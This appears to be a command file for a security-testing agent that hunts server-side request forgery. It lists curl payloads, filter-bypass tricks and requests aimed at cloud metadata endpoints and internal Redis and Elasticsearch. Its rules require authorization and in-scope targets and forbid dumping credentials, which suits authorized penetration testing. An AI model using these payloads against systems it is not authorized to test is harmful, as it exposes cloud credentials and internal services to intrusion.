---
description: SSRF hunt with filter bypass + cloud metadata chain + blind OOB confirmation. Usage: ssrf-chain <target-url> --param url --payload http://<oob>/
---

# /ssrf-chain

Find and confirm SSRF, then chain to internal/cloud metadata.

## Run This

```bash
# Start an OOB listener for blind confirmation:
python tools/oob_listener.py --start

# Baseline: fetch your own callback via the sink:
curl -s "<target-url>?url=http://<your-callback>/"

# Bypass ladder (try in order): redirects, DNS rebinding (rbndr.us), IP tricks (2130706433, 0177.0.0.1, 127.1, [::ffff:127.0.0.1]), hostname tricks (localhost@attacker.com), protocols (gopher://, dict://, file://), double-encoding
# Cloud metadata (if in scope):
curl -s "<target-url>?url=http://169.254.169.254/latest/meta-data/"       # AWS
curl -s "<target-url>?url=http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"  # GCP
# Internal services:
curl -s "<target-url>?url=http://127.0.0.1:6379/"                          # Redis
curl -s "<target-url>?url=http://127.0.0.1:9200/_cat/indices"              # Elasticsearch
```

## Workflow

1. Identify the sink and baseline with your own OOB endpoint. A correlated callback
   proves server-side fetching; classify it as blind SSRF until impact is demonstrated.
2. If blocked, ladder the bypasses (above) until one passes.
3. Escalate to metadata or internal services only with explicit authorization and a
   non-sensitive marker; never retrieve or retain credentials.
4. Blind SSRF: correlated OOB callback = `CONFIRMED_BLIND`; require a safe response or
   demonstrated impact before reporting a higher-impact chain.

## Rules

- Callbacks only to your own interactsh endpoint.
- Redact credentials; never dump secrets.
- No internal service exploitation without human approval + in-scope.

## Output

`findings/<target>/ssrf-<date>.md`: sink, bypass used, target reached, callback evidence.
